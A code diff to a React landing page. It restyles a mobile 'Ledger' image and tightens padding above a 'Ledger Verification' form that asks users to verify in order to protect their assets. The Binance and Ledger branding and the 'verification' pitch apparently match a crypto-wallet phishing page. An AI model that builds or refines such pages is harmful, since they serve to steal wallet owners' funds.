@@ -49,19 +49,20 @@ const Index = () => {
             />
           </div>
           
-          {/* Mobile view for Ledger image */}
-          <div className="md:hidden flex justify-center mt-6 mb-4">
+          {/* Mobile view for Ledger image - improved positioning as background element */}
+          <div className="absolute inset-0 z-0 md:hidden flex items-center justify-center opacity-30">
             <img 
               src="/lovable-uploads/c41e1819-05c2-4b68-babe-06fee72ca2a2.png" 
-              alt="Binance Ledger Device" 
-              className="max-w-[200px] h-auto"
+              alt=""
+              className="w-[300px] max-w-[80%] h-auto object-contain"
+              aria-hidden="true"
             />
           </div>
         </div>
         
-        {/* Form Section */}
-        <div className="container mx-auto px-2 sm:px-4 py-6 md:py-10 relative">
-          <div className="max-w-4xl mx-auto mb-8 md:mb-12 pt-6 md:pt-10 px-2 md:px-0">
+        {/* Form Section - reduced top padding on mobile */}
+        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-10 relative">
+          <div className="max-w-4xl mx-auto mb-6 md:mb-12 pt-3 md:pt-10 px-2 md:px-0">
             <h2 className="text-xl md:text-2xl font-bold mb-3 md:mb-4">Ledger Verification</h2>
             <p className="text-gray-300 text-sm md:text-base">
               To ensure the security of your assets, please complete the verification process below. 
